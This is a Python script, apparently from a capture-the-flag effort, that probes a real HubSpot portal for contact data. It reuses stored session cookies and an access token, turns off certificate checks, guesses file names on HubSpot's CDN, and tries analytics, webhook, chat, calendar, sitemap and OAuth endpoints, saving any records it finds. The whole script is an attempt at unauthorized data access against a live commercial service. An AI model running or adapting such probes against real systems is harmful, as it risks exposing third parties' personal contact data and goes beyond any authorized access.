#!/usr/bin/env python3
"""
Final attempt: Unconventional access methods
Trying creative/unusual ways to access the contact data
"""

import requests
import json
import os
import re
import urllib3
import base64
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = '46962361'

print("="*80)
print("UNCONVENTIONAL ACCESS METHODS - FINAL ATTEMPT")
print("="*80)

findings = []

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# ============================================================================
# 1. TRY EMAIL TRACKING / WEB ANALYTICS ENDPOINTS
# ============================================================================

print("\n[1] TESTING EMAIL TRACKING / ANALYTICS ENDPOINTS")
print("="*80)

tracking_endpoints = [
    # Email tracking
    f'https://track.hubspot.com/__ptq.gif?a={TARGET_PORTAL}&k=14&bu=https://example.com&r=https://example.com&vid=1',
    f'https://track.hubspot.com/v1/event?portalId={TARGET_PORTAL}&vid=1',

    # Analytics
    f'https://api.hubapi.com/analytics/v2/reports/totals?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/analytics/v2/views?portalId={TARGET_PORTAL}',

    # Reporting
    f'https://api.hubapi.com/crm-analytics/v1/reports?portalId={TARGET_PORTAL}',
]

for url in tracking_endpoints:
    print(f"\n{url[:75]}...")

    try:
        r = requests.get(url, verify=False, timeout=5)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                if 'firstname' in json.dumps(data).lower() or 'contact' in json.dumps(data).lower():
                    print(f"  *** Contains contact data! ***")
                    print(f"  {json.dumps(data, indent=2)[:500]}")
            except:
                pass
    except:
        pass

# ============================================================================
# 2. TRY WEBHOOK / CALLBACK ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("[2] TESTING WEBHOOK / CALLBACK ENDPOINTS")
print("="*80)

webhook_endpoints = [
    f'https://api.hubapi.com/webhooks/v1/{TARGET_PORTAL}/subscriptions',
    f'https://api.hubapi.com/automation/v3/workflows/{TARGET_PORTAL}',
    f'https://api.hubapi.com/integrations/v1/{TARGET_PORTAL}/timeline',
]

for url in webhook_endpoints:
    print(f"\n{url[:75]}...")

    try:
        r = requests.get(url, verify=False, timeout=5)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")
            except:
                pass
    except:
        pass

# ============================================================================
# 3. TRY CDN / STATIC FILE ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("[3] CHECKING CDN / STATIC FILES")
print("="*80)

cdn_urls = [
    f'https://cdn2.hubspot.net/hubfs/{TARGET_PORTAL}/contacts.json',
    f'https://cdn2.hubspot.net/hubfs/{TARGET_PORTAL}/contact-1.json',
    f'https://cdn2.hubspot.net/hubfs/{TARGET_PORTAL}/data.json',
    f'https://cdn2.hubspot.net/hubfs/{TARGET_PORTAL}/export.json',
    f'https://cdn2.hubspot.net/hubfs/{TARGET_PORTAL}/ctf.json',
    f'https://cdn2.hubspot.net/hubfs/{TARGET_PORTAL}/flag.json',

    f'https://f.hubspotusercontent00.net/hubfs/{TARGET_PORTAL}/contacts.json',
    f'https://f.hubspotusercontent00.net/hubfs/{TARGET_PORTAL}/contact-1.json',
]

for url in cdn_urls:
    print(f"\n{url}")

    try:
        r = requests.get(url, verify=False, timeout=5)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** FILE FOUND! ***")
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)}")

                if 'super_secret' in json.dumps(data).lower() or 'firstname' in json.dumps(data).lower():
                    print(f"\n  *** CONTAINS CONTACT DATA! ***")

                    findings.append({
                        'source': 'cdn_file',
                        'url': url,
                        'data': data
                    })
            except:
                print(f"  Content: {r.text[:500]}")
    except:
        pass

# ============================================================================
# 4. TRY TIMELINE / ACTIVITY ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("[4] TESTING TIMELINE / ACTIVITY ENDPOINTS")
print("="*80)

timeline_urls = [
    f'https://api.hubapi.com/integrations/v1/{TARGET_PORTAL}/timeline/event',
    f'https://api.hubapi.com/crm/v3/timeline/events?objectType=contact&objectId=1&portalId={TARGET_PORTAL}',
]

for url in timeline_urls:
    print(f"\n{url[:70]}...")

    try:
        r = requests.get(url, verify=False, timeout=5)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")
            except:
                pass
    except:
        pass

# ============================================================================
# 5. TRY CONVERSATIONS / CHAT ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("[5] TESTING CONVERSATIONS / CHAT ENDPOINTS")
print("="*80)

conversation_urls = [
    f'https://api.hubapi.com/conversations/v3/conversations/threads?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/conversations/v3/visitor-identification/tokens/create',
]

for url in conversation_urls:
    print(f"\n{url[:70]}...")

    # Try both GET and POST
    for method in ['GET', 'POST']:
        try:
            if method == 'GET':
                r = requests.get(url, verify=False, timeout=5)
            else:
                r = requests.post(url, json={'portalId': TARGET_PORTAL}, verify=False, timeout=5)

            print(f"  {method}: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()
                    print(f"    {json.dumps(data, indent=2)[:300]}")
                except:
                    pass
        except:
            pass

# ============================================================================
# 6. TRY CALENDAR / BOOKING ENDPOINTS (with various methods)
# ============================================================================

print("\n" + "="*80)
print("[6] TESTING CALENDAR / BOOKING ENDPOINTS")
print("="*80)

# Try to find meetings/calendars that might have contact info
meeting_urls = [
    f'https://api.hubapi.com/calendar/v1/events/for-contact/1?portalId={TARGET_PORTAL}',
    f'https://meetings.hubapi.com/meetings/v1/meetings/meeting-link/{TARGET_PORTAL}',
]

for url in meeting_urls:
    print(f"\n{url[:70]}...")

    try:
        r = requests.get(url, verify=False, timeout=5)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")

                if 'firstname' in json.dumps(data).lower():
                    findings.append({
                        'source': 'meeting_endpoint',
                        'url': url,
                        'data': data
                    })
            except:
                pass
    except:
        pass

# ============================================================================
# 7. TRY SITEMAP / SEARCH ENGINES
# ============================================================================

print("\n" + "="*80)
print("[7] CHECKING SITEMAPS")
print("="*80)

sitemap_urls = [
    f'https://{TARGET_PORTAL}.hs-sites.com/sitemap.xml',
    f'https://meetings.hubspot.com/sitemap.xml',
]

for url in sitemap_urls:
    print(f"\n{url}")

    try:
        r = requests.get(url, verify=False, timeout=5)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** SITEMAP FOUND! ***")

            # Parse URLs from sitemap
            urls = re.findall(r'<loc>(.+?)</loc>', r.text)
            print(f"  URLs found: {len(urls)}")

            for sitemap_url in urls[:20]:
                print(f"    {sitemap_url}")

                # Check each URL for contact data
                try:
                    page_r = requests.get(sitemap_url, verify=False, timeout=3)

                    if page_r.status_code == 200 and 'firstname' in page_r.text.lower():
                        print(f"      *** Contains 'firstname'! ***")
                except:
                    pass
    except:
        pass

# ============================================================================
# 8. TRY OAUTH / APP INSTALLATION CHECK
# ============================================================================

print("\n" + "="*80)
print("[8] CHECKING OAUTH / APP INSTALLATION")
print("="*80)

# Check if we can see app installations
app_urls = [
    f'https://api.hubapi.com/integrations/v1/{TARGET_PORTAL}/installed',
    f'https://api.hubapi.com/oauth/v1/access-tokens/{ACCESS_TOKEN}',
]

for url in app_urls:
    print(f"\n{url[:70]}...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    try:
        r = requests.get(url, headers=headers, verify=False, timeout=5)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:500]}")
            except:
                print(f"  {r.text[:300]}")
    except:
        pass

print("\n" + "="*80)
print("UNCONVENTIONAL METHODS TESTING COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} POTENTIAL DATA SOURCES! ***\n")

    with open('/home/user/Hub/findings/unconventional_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{finding.get('source')}:")
        print(f"  {json.dumps(finding, indent=2)[:600]}")

        # Check for CTF flag
        if 'firstname' in str(finding).lower() or 'super_secret' in str(finding).lower():
            print(f"\n  *** MAY CONTAIN CTF DATA! ***")
else:
    print("\nNo unconventional access methods successful.")
    print("\nAll standard and non-standard approaches have been exhausted.")
